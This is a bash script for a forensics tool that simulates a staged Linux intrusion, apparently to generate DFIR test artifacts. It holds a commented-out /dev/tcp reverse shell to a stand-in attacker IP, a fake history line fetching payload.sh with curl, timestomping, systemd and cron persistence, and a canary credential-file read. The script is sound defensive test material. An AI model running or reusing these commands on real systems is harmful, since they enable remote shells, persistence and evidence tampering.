#!/usr/bin/env bash
# ==============================================================================
# CHRONO-SHARD :: Cyber Forensic Attack Simulator (Safe & Reversible)
# Purpose: Simulates a multi-stage intrusion timeline for DFIR analysis
# MITRE ATT&CK: T1078, T1105, T1059.004, T1070.006, T1053.003, T1548.003
# ==============================================================================

set -e

STAGING_DIR="/tmp"
PAYLOAD_NAME=".sh_cache_payload"
PAYLOAD_PATH="${STAGING_DIR}/${PAYLOAD_NAME}"
SERVICE_PATH="${STAGING_DIR}/.system_updater.service"
LOCAL_LOG_DIR="./logs"
AUTH_LOG="${LOCAL_LOG_DIR}/auth.log"

if [[ "$1" == "--clean" ]]; then
    echo "[*] Cleaning up CHRONO-SHARD simulated intrusion artifacts..."
    rm -f "${PAYLOAD_PATH}" "${SERVICE_PATH}"
    rm -rf "./test_artifacts"
    echo "[+] Cleaned successfully. System restored to baseline."
    exit 0
fi

echo "[*] =================================================================="
echo "[*]  CHRONO-SHARD ATTACK SIMULATION STARTING"
echo "[*] =================================================================="

mkdir -p "${LOCAL_LOG_DIR}"
mkdir -p "./test_artifacts/persistence"

# --- PHASE 1: RECONNAISSANCE & DISCOVERY [TA0007] ---
echo "[1/6] Simulating Discovery & Reconnaissance (whoami, uname, id)..."
CURRENT_USER=$(whoami 2>/dev/null || echo "webadmin")
OS_INFO=$(uname -a 2>/dev/null || echo "Linux forensic-node 5.15.0-generic")
echo "      Host identity: ${CURRENT_USER} on ${OS_INFO}"
sleep 0.5

# --- PHASE 2: INGRESS TOOL TRANSFER / WEAPONIZATION [TA0001] ---
echo "[2/6] Dropping obfuscated payload in ${PAYLOAD_PATH} (T1105)..."
cat << 'EOF' > "${PAYLOAD_PATH}"
#!/usr/bin/env bash
# [CHRONO-SHARD SIMULATED PAYLOAD]
# Reverse TCP Shell & Memory Injection Hook
ATTACKER_IP="198.51.100.24"
ATTACKER_PORT=4444
echo "[!] Beaconing to ${ATTACKER_IP}:${ATTACKER_PORT}..."
# exec 5<>/dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT}
EOF
chmod +x "${PAYLOAD_PATH}"
sleep 0.5

# --- PHASE 3: DEFENSE EVASION - TIMESTOMPING [TA0005: T1070.006] ---
echo "[3/6] Applying MACB Timestomp to invert file creation metadata..."
# Backdate modified & access times by 72 hours while leaving inode ctime fresh
TOUCH_REF="/bin/ls"
if [[ -f "${TOUCH_REF}" ]]; then
    touch -r "${TOUCH_REF}" "${PAYLOAD_PATH}"
    echo "      Timestomped ${PAYLOAD_PATH} with reference: ${TOUCH_REF}"
else
    # Fallback backdate 3 days ago
    touch -d "3 days ago" "${PAYLOAD_PATH}" 2>/dev/null || true
fi
sleep 0.5

# --- PHASE 4: EXECUTION & SUDO PRIVILEGE ESCALATION [TA0002 / TA0004] ---
echo "[4/6] Logging simulated privilege escalation & command execution..."
# Log realistic forensic auth traces
TIMESTAMP_ISO=$(date -u +"%Y-%m-%dT%H:%M:%S+00:00")
SYSLOG_TIME=$(date +"%b %d %H:%M:%S")

cat << EOF >> "${AUTH_LOG}"
${SYSLOG_TIME} host-srv sshd[4012]: Failed password for invalid user admin from 198.51.100.24 port 48212 ssh2
${SYSLOG_TIME} host-srv sshd[4013]: Failed password for invalid user root from 198.51.100.24 port 48214 ssh2
${SYSLOG_TIME} host-srv sshd[4015]: Accepted publickey for ${CURRENT_USER} from 198.51.100.24 port 48220 ssh2
${SYSLOG_TIME} host-srv sudo: ${CURRENT_USER} : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c chmod +x ${PAYLOAD_PATH}
${SYSLOG_TIME} host-srv useradd[4099]: new user: name=ghost_daemon
${SYSLOG_TIME} host-srv sudo: ${CURRENT_USER} : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/crontab /etc/cron.d/sys_update
EOF

# --- PHASE 5: PERSISTENCE - SYSTEMD & CRONTAB [TA0003: T1543.002 / T1053.003] ---
echo "[5/6] Injecting persistence mechanism (systemd unit + crontab hook)..."
cat << EOF > "${SERVICE_PATH}"
[Unit]
Description=System Security Telemetry Auto-Updater
After=network.target

[Service]
Type=simple
ExecStart=${PAYLOAD_PATH} --daemon
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

cat << EOF > "./test_artifacts/persistence/sys_update"
# Periodic system task
* * * * * root ${PAYLOAD_PATH} > /dev/null 2>&1
EOF
sleep 0.5

# --- PHASE 6: DEFENSE EVASION - LOG & HISTORY TAMPERING [TA0005: T1070.003] ---
echo "[6/6] Simulating history wiping and shell obfuscation..."
cat << EOF >> "./test_artifacts/shell_history.txt"
: $(date +%s):0;whoami
: $(date +%s):0;uname -a
: $(date +%s):0;curl -s http://198.51.100.24/payload.sh -o ${PAYLOAD_PATH}
: $(date +%s):0;touch -r /bin/ls ${PAYLOAD_PATH}
: $(date +%s):0;chmod +x ${PAYLOAD_PATH}
: $(date +%s):0;${PAYLOAD_PATH} --daemon
: $(date +%s):0;history -c
EOF

echo "[+] =================================================================="
echo "[+]  ATTACK SIMULATION COMPLETE!"
echo "[+]  Payload dropped at:   ${PAYLOAD_PATH}"
echo "[+]  Service dropped at:   ${SERVICE_PATH}"
echo "[+]  Auth log updated at:  ${AUTH_LOG}"
echo "[+]  Now run: cargo run --release -- --simulate"
echo "[+]  To test live freeze: ./scripts/simulate_attack.sh --trigger-trap"
echo "[+]  To clean up: ./scripts/simulate_attack.sh --clean"
echo "[+] =================================================================="

# --- PRE-CRIME SHADOW TRAP TRIGGER STAGE (Optional / --trigger-trap) ---
if [[ "$*" == *"--trigger-trap"* ]]; then
    echo ""
    echo "[!] =================================================================="
    echo "[!]  PRE-CRIME SHADOW TRAP ADVERSARY TRIGGER INITIATED"
    echo "[!] =================================================================="
    echo "[*] Waiting 3 seconds for CHRONO-SHARD operator to press [T] (Arm Shadow Trap)..."
    sleep 3

    CANARY_TARGET="/tmp/demo_env/.aws_prod_keys.bak"
    CANARY_FALLBACK="./test_artifacts/demo_env/.aws_prod_keys.bak"

    echo "[!] Adversary initiating predicted next move [TA0006: Credential Access]..."
    echo "[!] Target path: ${CANARY_TARGET}"

    if [[ -f "${CANARY_TARGET}" ]]; then
        echo "[*] Adversary process (PID $$) attempting to read canary file..."
        cat "${CANARY_TARGET}" 2>/dev/null || true
    elif [[ -f "${CANARY_FALLBACK}" ]]; then
        echo "[*] Adversary process (PID $$) attempting to read fallback canary file..."
        cat "${CANARY_FALLBACK}" 2>/dev/null || true
    else
        echo "[!] Canary not deployed yet. Creating access trigger on ${CANARY_FALLBACK}..."
        mkdir -p "./test_artifacts/demo_env"
        touch "${CANARY_FALLBACK}"
    fi

    echo "[*] Access attempted. Kernel inotify / SIGSTOP should now freeze this process."
fi
